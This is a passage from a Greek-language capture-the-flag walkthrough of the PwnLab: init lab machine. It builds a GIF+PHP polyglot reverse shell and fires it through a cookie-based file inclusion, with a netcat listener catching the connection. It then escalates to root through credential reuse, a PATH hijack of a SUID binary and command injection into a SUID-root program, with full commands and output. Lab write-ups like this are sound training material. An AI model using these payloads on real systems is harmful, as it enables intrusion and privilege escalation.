$fname = md5($_FILES['file']['name']) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 'upload/' . $fname);
?>
```

**Τρεις έλεγχοι και μία συνέπεια:**

| Έλεγχος | Τι κάνει | Παράκαμψη |
| --- | --- | --- |
| **`in_array($ext, $whitelist)`** | **Μόνο επεκτάσεις εικόνας** | **`.gif`** — **θα το χρησιμοποιήσουμε** |
| **`getimagesize()`** | **Πρέπει να ΜΟΙΑΖΕΙ με πραγματική εικόνα** | **Magic bytes `GIF89a`** |
| **`md5(name).ext`** | **ΔΕΝ μπορείτε να διαλέξετε το όνομα** | **Πρέπει να το ΜΑΘΕΤΕ από τη σελίδα που το τυπώνει** |

**Το `pathinfo(…, PATHINFO_EXTENSION)`** επιστρέφει **το κείμενο μετά την ΤΕΛΕΥΤΑΙΑ τελεία** —
**γι' αυτό το `shell.php.gif` επιζεί ως `.gif`.** **Αυτή είναι η ρωγμή.**

**Και το κρίσιμο:** **το αρχείο αποθηκεύεται στο `upload/`** — **ΜΕΣΑ στο document root**.
**Άρα είναι προσβάσιμο μέσω HTTP** — **και, όπως θα δούμε, ΕΚΤΕΛΕΣΙΜΟ.**

### 7. Δημιουργία πολύγλωσσου GIF+PHP

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php
sed -i "s/1234/4444/" shell.php
grep -n '^\$ip\|^\$port' shell.php
printf 'GIF89a;\n' | cat - shell.php > shell.gif
file shell.gif
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```
```text
shell.gif: GIF image data, version 89a, 5493 x 1 bytes
```

| Εντολή | Ρόλος |
| --- | --- |
| **`cp /usr/share/webshells/php/php-reverse-shell.php`** | **Το Kali ΣΥΝΟΔΕΥΕΤΑΙ από έτοιμα webshells** — **μην τα γράφετε από την αρχή** |
| **`sed -i "s/…/…/"`** | **Επεξεργασία ΕΠΙ ΤΟΠΟΥ** |
| **`grep -n '^\$ip\|^\$port'`** | **ΤΟ ΒΗΜΑ ΕΠΑΛΗΘΕΥΣΗΣ** |
| **`printf 'GIF89a;\n' \| cat - shell.php`** | **Προθέτει τη μαγική υπογραφή** |
| **`file shell.gif`** | **Επιβεβαιώνει ότι αναγνωρίζεται ως GIF** |

**Ποτέ μην ανεβάσετε ένα κέλυφος του οποίου την IP νομίζετε ότι αλλάξατε** — **γιατί η αποτυχία
ΜΟΙΑΖΕΙ με πρόβλημα δικτύου.** **Το `grep` μετά το `sed` είναι η επαλήθευση.**

**Το `GIF89a`** είναι **η εξαψήφια μαγική υπογραφή** που **κάθε βιβλιοθήκη εικόνων ελέγχει**.
**Προθέτοντάς την, ικανοποιείτε ΚΑΙ το `getimagesize()` ΚΑΙ τη whitelist επεκτάσεων.**

**`5493 x 1 bytes`** — **το `file` διαβάζει την κεφαλίδα GIF ως «πλάτος × ύψος»**. **Εδώ βγαίνει
 nonsense** γιατί **το υπόλοιπο του αρχείου είναι PHP, όχι pixels** — **αλλά το `file` ΕΒΛΕΨΕ
την υπογραφή, και αυτό αρκεί.**

**Η PHP αγνοεί τα πάντα έξω από `<?php … ?>`**, άρα **η κεφαλίδα GIF είναι αδρανής** και **ο
κώδικας μετά τρέχει** — **με την προϋπόθεση ότι το αρχείο ΣΥΜΠΕΡΙΛΑΜΒΑΝΕΤΑΙ ως PHP.**

**Αυτό είναι το κόλπο, και ο λόγος για το επόμενο βήμα.**

### 8. Το δεύτερο LFI — μέσα σε cookie

**Ανεβάστε το `shell.gif` μέσω της πιστοποιημένης φόρμας, σημειώστε την τυπωμένη διαδρομή, και
μετά θυμηθείτε ότι το `index.php` περιέχει:**

```php
if (isset($_COOKIE['lang'])) { include($_COOKIE['lang']); }
```

**ΕΔΩ ΔΕΝ ΠΡΟΣΑΡΤΑΤΑΙ `.php`.** **Άρα αυτό το δεύτερο σημείο inclusion μπορεί να στοχεύσει το
`.gif` σας ΚΑΤΕΥΘΕΙΑΝ:**

```bash
nc -lvnp 4444                                                       # Kali, πρώτα
curl -s -b "lang=upload/<MD5>.gif" "http://TARGET/index.php?page=index"
```

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
Ncat: Connection from 192.168.56.101:52881.
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1 i686 GNU/Linux
www-data@pwnlab:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**`-b "NAME=VALUE"`** στέλνει cookie. **Αυτό είναι cookie-based LFI**, και **παρακάμπτει τον
περιορισμό «μόνο `.php`» της παραμέτρου `page`**.

**Δύο ανεξάρτητα σημεία inclusion με διαφορετικά φίλτρα είναι συχνό σε πραγματικό κώδικα —
βρείτε το πιο χαλαρό.**

**`i686` σημαίνει kernel 32-BIT**, **που περιορίζει κάθε μετέπειτα επιλογή exploit.**

**`uid=33(www-data)`** είναι **το αναμενόμενο foothold: μη προνομιούχο.**

**Αναβαθμίστε ΑΜΕΣΩΣ:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Προσοχή: `python`, ΟΧΙ `python3`** — **σε αυτή την εποχή του Debian δεν υπάρχει python3.**

### 9. www-data → kane: επανάχρηση διαπιστευτηρίων

```bash
su kane
id; ls -la /home/kane
```

```text
Password: kane
uid=1001(kane) gid=1001(kane) groups=1001(kane)
total 16
drwxr-xr-x 2 kane kane 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```

**Κωδικοί βάσης ΕΠΑΝΑΧΡΗΣΙΜΟΠΟΙΗΜΕΝΟΙ ως κωδικοί τοπικής σύνδεσης** — **η πιο συχνή πλαγινή
κίνηση σε πραγματικές αναθέσεις.**

**Ο λογαριασμός του `kent` δεν κρατά τίποτα χρήσιμο· του `kane` κρατά το παραπάνω εύρημα.**

**Διαβάστε το `-rwsr-sr-x` θέση προς θέση:**

| Θέση | Χαρακτήρες | Σημασία |
| --- | --- | --- |
| **1** | **`-`** | **Κανονικό αρχείο** |
| **2–4** | **`rws`** | **Owner: read + write + SUID** |
| **5–7** | **`r-s`** | **Group: read + SGID** (χωρίς write) |
| **8–10** | **`r-x`** | **Other: read + execute** |

**Το `s` στη θέση του OWNER είναι SUID· στη θέση του GROUP είναι SGID.** **Και ο ιδιοκτήτης είναι
`mike`** — **άρα όποιος τρέχει το `msgmike` το τρέχει ΩΣ mike**, **ανεξάρτητα από το ποιος
είναι.**

**Αυτό είναι το στάδιο 1: `kane` → `mike`.**

### 10. kane → mike: SUID και PATH hijack

```bash
strings /home/kane/msgmike | grep -iE 'cat|/bin|/usr'
```

```text
cat /home/mike/msg.txt
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
system
```

**Το `strings`** τυπώνει **κάθε ακολουθία εκτυπώσιμων χαρακτήρων σε ένα binary** —
**συμπεριλαμβανομένων των γραμμών εντολών που παραδίδει σε κέλυφος.**

**`cat` ΧΩΡΙΣ αρχικό `/` ΕΙΝΑΙ η ευπάθεια:** **το κέλυφος λύνει ένα σκέτο όνομα ψάχνοντας το
`$PATH` από αριστερά προς τα δεξιά και τρέχει το ΠΡΩΤΟ ταίριασμα.**

**Και η `system` στη λίστα επιβεβαιώνει ότι το binary ΚΑΝΕΙ fork κελύφους** — **άρα το `$PATH`
του καλούντος ΙΣΧΥΕΙ.**

```bash
cd /home/kane
printf '#!/bin/bash\n/bin/bash -i\n' > cat
chmod +x cat
export PATH=/home/kane:$PATH
/home/kane/msgmike
id
```

```text
mike@pwnlab:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

**Τα τρία βήματα:**

1. **Βάλτε έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο ΠΡΩΤΟ στο `$PATH`**
2. **Τοποθετήστε ένα εκτελέσιμο με όνομα ΑΚΡΙΒΩΣ ίδιο με τη σκέτη εντολή που καλεί το
   προνομιούχο πρόγραμμα**
3. **Καλέστε το πρόγραμμα**

**Το `msgmike` καλεί `cat`, βρίσκει το `/home/kane/cat` ΠΡΩΤΟ, και το τρέχει — με την ενεργή
ταυτότητα του mike, επειδή το binary είναι SUID mike.**

**Ανάλυση του `printf`:**

```bash
printf '#!/bin/bash\n/bin/bash -i\n' > cat
```

- **`#!/bin/bash`** = **shebang** — **λέει στον πυρήνα ποιος διερμηνέας να το τρέξει**
- **`/bin/bash -i`** = **interactive bash**
- **`printf` και όχι `echo`** — **γιατί το `echo` ΔΕΝ ερμηνεύει το `\n` σε όλα τα κελύφη**

**ΕΠΑΝΑΦΕΡΕΤΕ το περιβάλλον σας μετά:**

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Αλλιώς ΚΑΘΕ μετέπειτα εντολή θα βρίσκει το ψεύτικο `cat` σας** — **και το `cat /etc/passwd`
θα ανοίξει κέλυφος αντί να τυπώσει το αρχείο.**

### 11. mike → root: command injection στο `msg2root`

```bash
ls -la /home/mike
strings /home/mike/msg2root
```

```text
total 16
drwxr-xr-x 2 mike mike 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rwsr-xr-x 1 root root 5364 Mar 17  2016 msg2root
```
```text
Message for root:
/bin/echo %s >> /root/messages.txt
/lib/ld-linux.so.2
libc.so.6
printf
system
fgets
```

**SUID ROOT αυτή τη φορά** (`-rwsr-xr-x root root`).

**Και η συμβολοσειρά μορφοποίησης αποκαλύπτει τον μηχανισμό:**

```c
printf("Message for root: ");
fgets(input, 256, stdin);
system(sprintf(cmd, "/bin/echo %s >> /root/messages.txt", input));
```

**Η είσοδός σας περνά στο `/bin/echo` ΧΩΡΙΣ ΕΙΣΑΓΩΓΙΚΑ, μέσα σε εντολή κελύφους.**

**Οτιδήποτε πληκτρολογήσετε γίνεται ΜΕΡΟΣ εκείνης της γραμμής εντολής** — **άρα ένα `;`
ΤΕΡΜΑΤΙΖΕΙ το echo και ΞΕΚΙΝΑ τη δική σας εντολή, ΤΡΕΧΟΝΤΑΣ ΩΣ ROOT.**

```bash
/home/mike/msg2root
```

```text
Message for root: hello; id
hello
uid=1002(mike) gid=1002(mike) euid=0(root) groups=1002(mike)
```

**Διαβάστε το:**
- **`hello`** = **η έξοδος του `/bin/echo hello`** — **το πρώτο μισό της εντολής**
- **`uid=1002(mike) … euid=0(root)`** = **η έξοδος του `id`** — **το ΔΕΥΤΕΡΟ μισό, ως root**

**Η εντολή που εκτελέστηκε πραγματικά:**

```bash
/bin/echo hello; id >> /root/messages.txt
```

**Προσοχή στη σειρά:** **το `>> /root/messages.txt` πηγαίνει στο ΤΕΛΟΣ**, άρα **ανακατευθύνει
τη ΔΙΚΗ ΣΑΣ εντολή**. **Για να την αποφύγετε, χρησιμοποιήστε `#`:**

```bash
/home/mike/msg2root
# Message for root: hello; /bin/bash -p #
```

**Το `#` μετατρέπει το υπόλοιπο σε ΣΧΟΛΙΟ** — **άρα το `>> /root/messages.txt` αγνοείται.**

**`-p`** = **preserve privileges**. **ΧΩΡΙΣ αυτό, το bash ΡΙΧΝΕΙ το euid στο uid** — **και
παίρνετε `$` αντί για `#`.**

```text
# id
uid=1002(mike) gid=1002(mike) euid=0(root) groups=1002(mike)
# cat /root/root.txt
```

```text
Congrats, you did it!
```

### 12. Η πλήρης αλυσίδα — τέσσερα άλματα, τρεις μηχανισμοί

```text
www-data ──(κωδικός βάσης)──► kane ──(PATH hijack σε SUID mike)──► mike ──(cmd injection σε SUID root)──► root
   │                            │                                      │                                     │
 cookie LFI                  msgmike                                msg2root                              /root/root.txt
 + polyglot GIF              SUID mike, καλεί `cat`                 SUID root, καλεί `system()`
                             χωρίς απόλυτη διαδρομή                 με αμετάβλητη είσοδο
```

| Άλμα | Μηχανισμός | Εντολή ανίχνευσης |
| --- | --- | --- |
| **www-data** | **Cookie LFI + polyglot** | **`php://filter`** στον πηγαίο κώδικα |
| **→ kane** | **Επανάχρηση διαπιστευτηρίων** | **`cat /etc/passwd`** + κωδικοί από τη βάση |
| **→ mike** | **PATH hijack σε SUID** | **`strings` + `ls -la`** |
| **→ root** | **Command injection σε SUID root** | **`strings`** |

**Το δίδαγμα: το `strings` σε κάθε SUID binary είναι ΔΥΟ δευτερόλεπτα και αποκαλύπτει ΟΛΟΚΛΗΡΟ
τον μηχανισμό.** **Κάντε το ΠΡΙΝ δοκιμάσετε payloads.**

**Και τα δύο SUID binaries έχουν το ίδιο θεμελιώδες σφάλμα:**
**καλούν κέλυφος.** **Ένα SUID binary που καλεί κέλυφος είναι μια εντολή root που δέχεται
είσοδο.**

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 9 — CengBox: 1](<09-cengbox-1.md>) · επόμενο: [Μηχάνημα 11 — Photographer: 1](<11-photographer-1.md>) · πλήρες walkthrough: [`labs/3-057-pwnlab-init`](../../labs/3-057-pwnlab-init/README.md)_
